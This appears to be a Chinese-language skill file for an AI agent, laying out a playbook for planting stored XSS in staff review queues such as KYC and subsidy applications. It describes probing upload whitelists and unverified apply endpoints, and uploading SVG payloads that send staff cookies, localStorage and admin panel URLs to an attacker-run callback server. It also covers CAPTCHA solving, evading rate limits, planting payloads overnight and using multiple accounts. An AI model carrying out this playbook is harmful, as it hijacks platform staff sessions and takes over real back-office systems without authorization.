---
name: staff-review-xss-arming
description: Use when arming stored XSS via staff review/apply flows.
version: 1.0.0
license: MIT
platforms: [linux]
---

# Staff-Review Flow XSS 军火 (申请/审核流存储 XSS 打击)

## 触发
- 目标平台有「用户提交材料 → 工作人员在后台浏览器查看/审核」的业务流: KYC/实名认证、会员卡/补贴/扶贫申请、协议签署(签名图)、工单附件、素材上传。
- 正门(登录/注册/KYC)被核验墙堵死, 但业务流仍在收材料 → **审核队列 = 保证被 staff 打开的存储 XSS 落点**。
- 用户提到: 存储XSS/盲打/后台XSS/审核流/军火/回连/staff面板。

## 核心认知
1. 平台通常有两类提交族: **核验类**(authadd/实名 — 三要素+后台真核验, 假材料死) vs **申请类**(*/apply — 只查字段完整性, 图片字段=任意路径串直接收)。**打申请族**。
2. 上传白名单常见 **只拦 php 族, svg/txt/图放行**; 存储多为内容寻址(同内容=同 hash 路径, 变体需改内容)。
3. 审核材料由 staff 在**后台浏览器**打开 → SVG 内的 JS 直接在 staff 会话执行。
4. 记录提交后多**一次性锁定**(重复提交不覆盖/假成功) → payload 要一次到位, 用最终版; 布设前把版本定稿。
5. 别只埋一条: 多账号 × 多流程 = 多保险; **已过实名验证的真号审核优先级最高**(真人材料被优先处理)。

## 步骤
### 1. 摸申请族端点
- 前端 chunk 里找 `/api/*/apply`、`agreement`、`fupin`、`cardApply`、`tax_apply` 及上传端点的调用现场(字段名)。
- **空 POST/缺字段探测**逐端点跑: 读错误文案区分「无核验」(字段级报错/直接成功) vs「要核验」(身份校验错误)。
- 字段名会反直觉/跨模块漂移(同一平台 `sfzf_image` vs `sfzf` 并存过) — 以各自页面 chunk 的调用现场为准。

### 2. 上传面
- `common/upload` 类(multipart file): 白名单探测矩阵 — 试 `x.php` / `x.php.gif` / `.svg` / `.txt` / 图; 记录放行集 + 返回的存储域(常与主域分离)。
- SVG 过 → 存储 XSS 成立; 返回里 url(相对) vs fullurl(存储域) 都记下, 表单里填可直接访问的路径。

### 3. Payload 设计 (SVG, 三层兜底)
- 层1 `fetch()`: 带 cookie+localStorage+location → 常被 HTTPS 后台的混合内容策略拦(http 回调在 https 页)。
- 层2 `new Image()`: 更宽松但拿不到响应/自定义头。
- 层3 **顶层导航回退**(定时 ~3.5s): `location.href = http://.../?d=<encodeURIComponent(数据)>` — 顶层导航不受混合内容限制, 且**请求自动带 Referer=当前面板 URL**(后台地址必泄漏)。
- 每次只发一次(标记防重复), 数据全编进 query; 监听端回假图(GIF89a)防被发现。
- 完整 payload 代码: `references/xx1-apply-xss-arming.md`。

### 4. 回连基础设施
- 公网跳板(自有服务器, 非目标机)跑 python http.server 记日志; 响应 GIF89a/1px 假图。
- **cron monitor 自动盯**: 调度器原生 `monitor=<脚本>`(输出变化才唤醒 agent, 无变化零成本) — 脚本=ssh 拉监听器日志尾部+行数。
- 命中后解析: cookie(会话/CSRF/后台token)、localStorage、Referer(面板 URL)、UA。

### 5. 布设纪律
- 先**验证回连链路全通**(手动开一次 payload URL, 确认监听器收到), 再布设正式军火。
- 提交后确认落库(成功文案 + 记录 id), 台账记下 id。
- 布设时机: 审核在工作时段发生 → 晚上布设、早上命中。

## 踩坑
- 平台 JSON 响应可能带 **UTF-8 BOM** → python `decode('utf-8-sig')` 才能 loads。
- 注册/登录常受 **IP 级节流**(探测风暴后注册全 '访问太过频繁'; 换自有跳板 IP 也可能被边缘 WAF 墙 000) → 需注册的动作**前置**(先注册, 再探测)。
- 登录图形验证码 → ddddocr, 重试到正确位数(如 4 位数字)才算过。
- 账号体系常见 **per-brand 隔离**(同集团多品牌各不相通) — 别把 A 品牌票拿去 B 品牌收割。
- token 传法跟平台走: 有的 header, 有的 **JSON body**(如 `{token, site}`) — 读客户端代码调用现场。
- 布设前查端口占用 (旧 http.server 霸占端口导致监听器没起)。

## 验证清单
- [ ] 上传: payload SVG 上传成功且**匿名可访问**该 URL(确认存储可公开读)
- [ ] 提交: 申请端点返回成功文案 + 记录 id
- [ ] 回连: 端到端实测(测试命中)通
- [ ] 监视: cron monitor 在线, 日志 diff 生效
- [ ] 台账: 记录 id/账号/payload 版本落报告
